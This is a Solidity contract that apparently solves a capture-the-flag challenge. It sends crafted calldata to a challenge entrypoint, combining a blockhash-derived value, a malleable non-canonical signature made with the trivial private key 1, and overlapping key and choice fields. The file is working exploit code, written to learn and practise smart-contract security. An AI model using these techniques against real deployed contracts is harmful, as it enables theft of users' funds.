pragma solidity 0.4.24;

import "./Setup.sol";

// https://ethereum.stackexchange.com/questions/13652/how-do-you-sign-an-verify-a-message-in-javascript-proving-you-own-an-ethereum-ad
// hexPrivateKey = "0x0000000000000000000000000000000000000000000000000000000000000001";
// signingKey = new ethers.utils.SigningKey(hexPrivateKey);
// digest = ethers.utils.id("stage1");
// signature = signingKey.signDigest(digest);
// joinedSignature = ethers.utils.joinSignature(signature);
// recoveredAddress = ethers.utils.recoverAddress(digest, signature);
// Sign with canonical: false and v = 28 
// canonical: true is low mode


contract DappSolve {
    event log_string(string);
    event log_bytes32(bytes32);
    event log_address(address);

    Entrypoint ep;

    // Signature
    uint8 v = uint8(28);
    bytes32 r = 0x370df20998cc15afb44c2879a3c162c92e703fc4194527fb6ccf30532ca1dd3b;
    bytes32 s = 0xca4c0d1d00a7c0126700ff7ec223814d40a01d242c888ea751a592e2336252da;

    // Stage 4
    bytes32 choose_keccak256 = keccak256(abi.encodePacked("choose"));

    constructor(Setup _setup) {
        ep = _setup.entrypoint();

        // Block number
        uint256 stage1Payload = uint256(bytes4(blockhash(block.number - 1))) << 224;

        // Signature
        uint256 stage1And2Payload = stage1Payload + uint256(v);

        // First, second, and third payload
        uint256 stage1And2And3Payload = stage1And2Payload + uint256(0xff00);


        bytes memory data = abi.encodePacked(
            ep.getSelector(),
            stage1And2And3Payload,  // idx     | choices[0] 
            r,                      // key[0]  | choices[1] 
            s,                      // key[1]  | choices[2] 
            uint256(s) + 2,         // key[2]  | choices[3] 
            choose_keccak256,       // key[3]  | choices[4] 
            r,                      // lock[0] | choices[5] 
            uint8(4)                // lock[1] | choice     
        );


        ep.call(data);
    }
}
